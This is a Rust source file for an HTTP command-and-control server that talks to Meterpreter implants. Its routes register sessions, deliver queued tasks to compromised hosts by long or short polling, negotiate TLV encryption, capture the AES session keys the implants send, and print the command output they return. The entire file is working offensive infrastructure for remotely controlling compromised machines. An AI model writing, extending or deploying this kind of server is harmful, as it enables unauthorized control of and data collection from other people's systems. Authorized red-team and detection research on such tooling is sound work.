use std::net::SocketAddr;
use std::future::Future;
use std::time::{SystemTime, UNIX_EPOCH};

use axum::{
    body::Bytes,
    extract::ConnectInfo,
    extract::State,
    response::IntoResponse,
    routing::get,
    routing::post,
    Router,
};

use core_defs::meterpreter::{decode_frame, encode_frame};
use core_defs::packer::MpTlv;

use crate::tasking::AppState;

const TLV_TYPE_COMMAND_ID: u32 = 0x0002_0001;
const TLV_TYPE_SYM_KEY: u32 = 0x0004_0228;
const TLV_TYPE_STRING: u32 = 0x0001_000A;
const COMMAND_ID_CORE_NEGOTIATE_TLV_ENCRYPTION: u32 = 16;
const PACKET_TYPE_REQUEST: u32 = 0;

fn tlv_uint(typ: u32, v: u32) -> MpTlv {
    MpTlv {
        typ,
        value: v.to_be_bytes().to_vec(),
    }
}

fn decode_wstring(value: &[u8]) -> Option<String> {
    if value.len() < 2 {
        return None;
    }
    let mut u16s: Vec<u16> = Vec::with_capacity(value.len() / 2);
    let mut i = 0;
    while i + 1 < value.len() {
        let wc = u16::from_le_bytes([value[i], value[i + 1]]);
        if wc == 0 {
            break;
        }
        u16s.push(wc);
        i += 2;
    }
    if u16s.is_empty() {
        None
    } else {
        Some(String::from_utf16_lossy(&u16s))
    }
}

pub async fn serve_with_shutdown<F>(addr: SocketAddr, state: AppState, shutdown: F)
where
    F: Future<Output = ()> + Send + 'static,
{
    let app = Router::new()
        .route("/register", post(register))
        .route("/mp/checkin", get(mp_checkin).post(mp_checkin))
        .route("/mp/result", get(mp_checkin).post(mp_result))
        .with_state(state);

    let listener = tokio::net::TcpListener::bind(addr)
        .await
        .expect("bind failed");

    axum::serve(listener, app.into_make_service_with_connect_info::<SocketAddr>())
        .with_graceful_shutdown(shutdown)
        .await
        .expect("serve failed");
}

fn guid_to_hex(g: [u8; 16]) -> String {
    let mut out = String::with_capacity(32);
    for b in g {
        out.push_str(&format!("{:02x}", b));
    }
    out
}

#[cfg(debug_assertions)]
fn now_ms() -> u128 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_millis()
}

#[cfg(debug_assertions)]
fn log_http(
    route: &str,
    remote: Option<SocketAddr>,
    guid: Option<[u8; 16]>,
    decode_ok: Option<bool>,
    poll_mode: Option<(bool, u64)>,
) {
    let ts = now_ms();
    let remote = remote
        .map(|r| r.to_string())
        .unwrap_or_else(|| "(unknown)".into());
    let guid = guid.map(guid_to_hex).unwrap_or_else(|| "(none)".into());
    let decode = decode_ok
        .map(|b| if b { "ok" } else { "fail" })
        .unwrap_or("n/a");
    let poll = match poll_mode {
        Some((true, ms)) => format!("long:{}", ms),
        Some((false, _)) => "short".to_string(),
        None => "n/a".to_string(),
    };

    println!(
        "ts_ms={} remote={} route={} guid={} decode={} poll_mode={}",
        ts, remote, route, guid, decode, poll
    );
}

#[cfg(not(debug_assertions))]
fn log_http(
    _route: &str,
    _remote: Option<SocketAddr>,
    _guid: Option<[u8; 16]>,
    _decode_ok: Option<bool>,
    _poll_mode: Option<(bool, u64)>,
) {
}

async fn register(
    ConnectInfo(remote): ConnectInfo<SocketAddr>,
    State(state): State<AppState>,
    _body: Bytes,
) -> impl IntoResponse {
    let _id = state.new_session_id().await;
    log_http("/register", Some(remote), None, None, None);
    (axum::http::StatusCode::OK, "ok")
}

async fn mp_checkin(
    ConnectInfo(remote): ConnectInfo<SocketAddr>,
    State(state): State<AppState>,
    body: Bytes,
) -> impl IntoResponse {
    state.inc_checkins().await;
    let mut guid = [0u8; 16];
    let mut decode_ok = None;
    if body.len() >= 32 {
        if let Ok((hdr, _)) = decode_frame(&body, None) {
            guid.copy_from_slice(&hdr.session_guid);
            decode_ok = Some(true);
        } else {
            decode_ok = Some(false);
        }
    } else {
        if let Some(g) = state.get_active_guid().await {
            guid = g;
        }
    }

    state.register_mp_session(guid).await;

    let (enabled, key_opt) = state.mp_get_state(&guid).await.unwrap_or((false, None));
    let poll_mode = state.poll_mode().await;

    if let Some(task) = state.mp_take_next_task(&guid).await {
        let kref = if enabled { key_opt.as_ref() } else { None };
        let frame = encode_frame(guid, PACKET_TYPE_REQUEST, &task, kref);
        state.inc_tasks_delivered().await;
        log_http("/mp/checkin", Some(remote), Some(guid), decode_ok, Some(poll_mode));
        return (
            [("content-type", "application/octet-stream")],
            frame,
        )
            .into_response();
    }

    if enabled {
        let (long_poll, timeout_ms) = poll_mode;
        if long_poll {
            let deadline = tokio::time::Instant::now() + tokio::time::Duration::from_millis(timeout_ms);
            loop {
                if let Some(task) = state.mp_take_next_task(&guid).await {
                    let kref = key_opt.as_ref();
                    let frame = encode_frame(guid, PACKET_TYPE_REQUEST, &task, kref);
                    state.inc_tasks_delivered().await;
                    log_http("/mp/checkin", Some(remote), Some(guid), decode_ok, Some(poll_mode));
                    return (
                        [("content-type", "application/octet-stream")],
                        frame,
                    )
                        .into_response();
                }
                if tokio::time::Instant::now() >= deadline {
                    break;
                }
                tokio::time::sleep(tokio::time::Duration::from_millis(250)).await;
            }
        }
        log_http("/mp/checkin", Some(remote), Some(guid), decode_ok, Some(poll_mode));
        return (
            axum::http::StatusCode::OK,
            axum::body::Body::empty(),
        )
            .into_response();
    }

    let tlvs = vec![tlv_uint(TLV_TYPE_COMMAND_ID, COMMAND_ID_CORE_NEGOTIATE_TLV_ENCRYPTION)];
    let frame = encode_frame(guid, PACKET_TYPE_REQUEST, &tlvs, None);

    log_http("/mp/checkin", Some(remote), Some(guid), decode_ok, Some(poll_mode));

    (
        [("content-type", "application/octet-stream")],
        frame,
    )
        .into_response()
}

async fn mp_result(
    ConnectInfo(remote): ConnectInfo<SocketAddr>,
    State(state): State<AppState>,
    body: Bytes,
) -> impl IntoResponse {
    state.inc_results().await;
    let mut used_guid = [0u8; 16];
    let mut tlvs = Vec::new();
    let mut decode_ok = false;

    // best-effort decode: try plaintext, then stored key if known
    if let Ok((hdr, t)) = decode_frame(&body, None) {
        used_guid.copy_from_slice(&hdr.session_guid);
        tlvs = t;
        decode_ok = true;
    } else if let Some(g) = core_defs::meterpreter::peek_session_guid(&body) {
        if let Some((_enabled, key_opt)) = state.mp_get_state(&g).await {
            if let Some(key) = key_opt.as_ref() {
                if let Ok((hdr, t)) = decode_frame(&body, Some(key)) {
                    used_guid.copy_from_slice(&hdr.session_guid);
                    tlvs = t;
                    decode_ok = true;
                }
            }
        }
    }

    if !decode_ok {
        state.inc_decode_failures().await;
    }

    for t in &tlvs {
        if t.typ == TLV_TYPE_SYM_KEY && t.value.len() == 32 {
            let mut arr = [0u8; 32];
            arr.copy_from_slice(&t.value[..32]);
            state.mp_set_aes_key(used_guid, arr).await;
        }
    }

    for t in &tlvs {
        if t.typ == TLV_TYPE_STRING {
            if let Some(s) = decode_wstring(&t.value) {
                state.mp_push_output(used_guid, s.clone()).await;
                println!("mp_output guid={} {}", guid_to_hex(used_guid), s);
            }
        }
    }

    log_http("/mp/result", Some(remote), Some(used_guid), Some(decode_ok), None);

    (axum::http::StatusCode::OK, "")
}
